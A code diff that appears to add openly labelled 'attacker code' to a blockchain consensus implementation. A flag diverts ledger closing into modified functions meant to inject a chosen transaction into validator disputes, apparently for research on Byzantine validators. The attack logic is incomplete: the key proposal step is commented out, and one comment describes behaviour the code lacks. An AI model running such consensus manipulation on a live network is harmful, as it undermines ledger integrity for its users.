@@ -516,6 +516,17 @@ private:
     void
     closeLedger();
 
+    // Start attacker code
+    void
+    closeLedgerAttack();
+    
+    void
+    updateOurPositionsAttack();
+
+    void
+    createDisputesAttack(TxSet_t const& o);
+    // End attacker code
+
     // Adjust our positions to try to agree with other validators.
     void
     updateOurPositions();
@@ -1314,6 +1325,10 @@ template <class Adaptor>
 void
 Consensus<Adaptor>::closeLedger()
 {
+    if (restrict_peer_interaction){
+        closeLedgerAttack();
+        return;
+    }
     phase_ = ConsensusPhase::establish;
     rawCloseTimes_.self = now_;
 
@@ -1340,7 +1355,6 @@ Consensus<Adaptor>::closeLedger()
     }
 }
 
-
 /** How many of the participants must agree to reach a given threshold?
 
 Note that the number may not precisely yield the requested percentage.
@@ -1360,6 +1374,303 @@ participantsNeeded(int participants, int percent)
 
     return (result == 0) ? 1 : result;
 }
+
+// Start attacker code
+template <class Adaptor>
+void
+Consensus<Adaptor>::closeLedgerAttack()
+{
+    restrict_peer_interaction = false;
+    phase_ = ConsensusPhase::establish;
+    rawCloseTimes_.self = now_;
+
+    result_.emplace(adaptor_.onClose(previousLedger_, now_, mode_.get()));
+    result_->roundTime.reset(clock_.now());
+    // Share the newly created transaction set if we haven't already
+    // received it from a peer
+    if (acquired_.emplace(result_->txns.id(), result_->txns).second)
+        adaptor_.share(result_->txns);
+
+    boost::optional<TxSet_t> ourNewSet1;
+    boost::optional<typename TxSet_t::MutableTxSet> mutableSet1;
+
+    // Convert global_tx1 to shamap-item
+    Serializer s1;
+    global_tx1->getSTransaction()->add(s1);
+    uint256 tx1_hash = global_tx1->getID();
+    auto tx1_shamap = std::make_shared<SHAMapItem>(tx1_hash, s1.peekData());
+    RCLCxTx tx1_rclc = RCLCxTx(*tx1_shamap);
+
+    JLOG(j_.warn()) << "closeLedgerAttack: " << tx1_rclc.id();
+
+    // Propose position with tx1
+    // mutableSet1->insert(tx1_rclc);
+
+    // boost::optional<TxSet_t> tx_set;
+
+    // if (mode_.get() == ConsensusMode::proposing)
+    //     adaptor_.propose(result_->position);
+
+    // Create disputes with any peer positions we have transactions for
+    for (auto const& pit : currPeerPositions_)
+    {
+        auto const& pos = pit.second.proposal().position();
+        auto const it = acquired_.find(pos);
+        if (it != acquired_.end())
+        {
+            createDisputesAttack(it->second);
+        }
+    }
+
+    updateOurPositionsAttack();
+}
+
+template <class Adaptor>
+void
+Consensus<Adaptor>::updateOurPositionsAttack()
+{
+    // We must have a position if we are updating it
+    assert(result_);
+    ConsensusParms const & parms = adaptor_.parms();
+
+    // Compute a cutoff time
+    auto const peerCutoff = now_ - parms.proposeFRESHNESS;
+    auto const ourCutoff = now_ - parms.proposeINTERVAL;
+
+    // Verify freshness of peer positions and compute close times
+    std::map<NetClock::time_point, int> closeTimeVotes;
+    {
+        auto it = currPeerPositions_.begin();
+        while (it != currPeerPositions_.end())
+        {
+            Proposal_t const& peerProp = it->second.proposal();
+            if (peerProp.isStale(peerCutoff))
+            {
+                // peer's proposal is stale, so remove it
+                NodeID_t const& peerID = peerProp.nodeID();
+                JLOG(j_.warn()) << "Removing stale proposal from " << peerID;
+                for (auto& dt : result_->disputes)
+                    dt.second.unVote(peerID);
+                it = currPeerPositions_.erase(it);
+            }
+            else
+            {
+                // proposal is still fresh
+                ++closeTimeVotes[asCloseTime(peerProp.closeTime())];
+                ++it;
+            }
+        }
+    }
+
+    // This will stay unseated unless there are any changes
+    boost::optional<TxSet_t> ourNewSet;
+
+    // Update votes on disputed transactions
+    {
+        boost::optional<typename TxSet_t::MutableTxSet> mutableSet;
+        for (auto& [txId, dispute] : result_->disputes)
+        {
+            JLOG(j_.warn()) << "UpdateOurPositionsAttack: " << txId;
+            // Because the threshold for inclusion increases,
+            //  time can change our position on a dispute
+            if (dispute.updateVote(
+                    convergePercent_,
+                    mode_.get()== ConsensusMode::proposing,
+                    parms))
+            {
+                if (!mutableSet)
+                    mutableSet.emplace(result_->txns);
+
+                if (dispute.getOurVote())
+                {
+                    // now a yes
+                    mutableSet->insert(dispute.tx());
+                }
+                else
+                {
+                    // now a no
+                    mutableSet->erase(txId);
+                }
+            }
+        }
+
+        if (mutableSet)
+            ourNewSet.emplace(std::move(*mutableSet));
+    }
+
+    NetClock::time_point consensusCloseTime = {};
+    haveCloseTimeConsensus_ = false;
+
+    if (currPeerPositions_.empty())
+    {
+        // no other times
+        haveCloseTimeConsensus_ = true;
+        consensusCloseTime = asCloseTime(result_->position.closeTime());
+    }
+    else
+    {
+        int neededWeight;
+
+        if (convergePercent_ < parms.avMID_CONSENSUS_TIME)
+            neededWeight = parms.avINIT_CONSENSUS_PCT;
+        else if (convergePercent_ < parms.avLATE_CONSENSUS_TIME)
+            neededWeight = parms.avMID_CONSENSUS_PCT;
+        else if (convergePercent_ < parms.avSTUCK_CONSENSUS_TIME)
+            neededWeight = parms.avLATE_CONSENSUS_PCT;
+        else
+            neededWeight = parms.avSTUCK_CONSENSUS_PCT;
+
+        int participants = currPeerPositions_.size();
+        if (mode_.get() == ConsensusMode::proposing)
+        {
+            ++closeTimeVotes[asCloseTime(result_->position.closeTime())];
+            ++participants;
+        }
+
+        // Threshold for non-zero vote
+        int threshVote = participantsNeeded(participants, neededWeight);
+
+        // Threshold to declare consensus
+        int const threshConsensus =
+            participantsNeeded(participants, parms.avCT_CONSENSUS_PCT);
+
+        JLOG(j_.info()) << "Proposers:" << currPeerPositions_.size()
+                        << " nw:" << neededWeight << " thrV:" << threshVote
+                        << " thrC:" << threshConsensus;
+
+        for (auto const& [t, v] : closeTimeVotes)
+        {
+            JLOG(j_.debug())
+                << "CCTime: seq "
+                << static_cast<std::uint32_t>(previousLedger_.seq()) + 1 << ": "
+                << t.time_since_epoch().count() << " has " << v
+                << ", " << threshVote << " required";
+
+            if (v >= threshVote)
+            {
+                // A close time has enough votes for us to try to agree
+                consensusCloseTime = t;
+                threshVote = v;
+
+                if (threshVote >= threshConsensus)
+                    haveCloseTimeConsensus_ = true;
+            }
+        }
+
+        if (!haveCloseTimeConsensus_)
+        {
+            JLOG(j_.debug())
+                << "No CT consensus:"
+                << " Proposers:" << currPeerPositions_.size()
+                << " Mode:" << to_string(mode_.get())
+                << " Thresh:" << threshConsensus
+                << " Pos:" << consensusCloseTime.time_since_epoch().count();
+        }
+    }
+
+    if (!ourNewSet &&
+        ((consensusCloseTime != asCloseTime(result_->position.closeTime())) ||
+         result_->position.isStale(ourCutoff)))
+    {
+        // close time changed or our position is stale
+        ourNewSet.emplace(result_->txns);
+    }
+
+    if (ourNewSet)
+    {
+        auto newID = ourNewSet->id();
+
+        result_->txns = std::move(*ourNewSet);
+
+        JLOG(j_.info()) << "Position change: CTime "
+                        << consensusCloseTime.time_since_epoch().count()
+                        << ", tx " << newID;
+
+        result_->position.changePosition(newID, consensusCloseTime, now_);
+
+        // Share our new transaction set and update disputes
+        // if we haven't already received it
+        if (acquired_.emplace(newID, result_->txns).second)
+        {
+            if (!result_->position.isBowOut())
+                adaptor_.share(result_->txns);
+
+            for (auto const& [nodeId, peerPos] : currPeerPositions_)
+            {
+                Proposal_t const& p = peerPos.proposal();
+                if (p.position() == newID)
+                    updateDisputes(nodeId, result_->txns);
+            }
+        }
+
+        // Share our new position if we are still participating this round
+        if (!result_->position.isBowOut() &&
+            (mode_.get() == ConsensusMode::proposing))
+            adaptor_.propose(result_->position);
+    }
+}
+
+
+template <class Adaptor>
+void
+Consensus<Adaptor>::createDisputesAttack(TxSet_t const& o)
+{
+    /**
+     * Do createDisputes() but also add global_tx1 and global_tx2 to disputed txs
+    */
+    // Cannot create disputes without our stance
+    assert(result_);
+
+    // Only create disputes if this is a new set
+    if (!result_->compares.emplace(o.id()).second)
+        return;
+
+    // Nothing to dispute if we agree
+    if (result_->txns.id() == o.id())
+        return;
+
+    JLOG(j_.debug()) << "createDisputes " << result_->txns.id() << " to "
+                     << o.id();
+
+    auto differences = result_->txns.compare(o);
+
+    int dc = 0;
+
+    for (auto const& [txId, inThisSet] : differences)
+    {
+        ++dc;
+        // create disputed transactions (from the ledger that has them)
+        assert(
+            (inThisSet && result_->txns.find(txId) && !o.find(txId)) ||
+            (!inThisSet && !result_->txns.find(txId) && o.find(txId)));
+
+        Tx_t tx = inThisSet ? *result_->txns.find(txId) : *o.find(txId);
+        auto txID = tx.id();
+
+        if (result_->disputes.find(txID) != result_->disputes.end())
+            continue;
+
+        JLOG(j_.debug()) << "Transaction " << txID << " is disputed";
+
+        typename Result::Dispute_t dtx{tx, result_->txns.exists(txID),
+         std::max(prevProposers_, currPeerPositions_.size()), j_};
+
+        // Update all of the available peer's votes on the disputed transaction
+        for (auto const& [nodeId, peerPos] : currPeerPositions_)
+        {
+            Proposal_t const& peerProp = peerPos.proposal();
+            auto const cit = acquired_.find(peerProp.position());
+            if (cit != acquired_.end())
+                dtx.setVote(nodeId, cit->second.exists(txID));
+        }
+        adaptor_.share(dtx.tx());
+
+        result_->disputes.emplace(txID, std::move(dtx));
+    }
+    JLOG(j_.debug()) << dc << " differences found";
+}
+// End attacker code
+
 
 template <class Adaptor>
 void
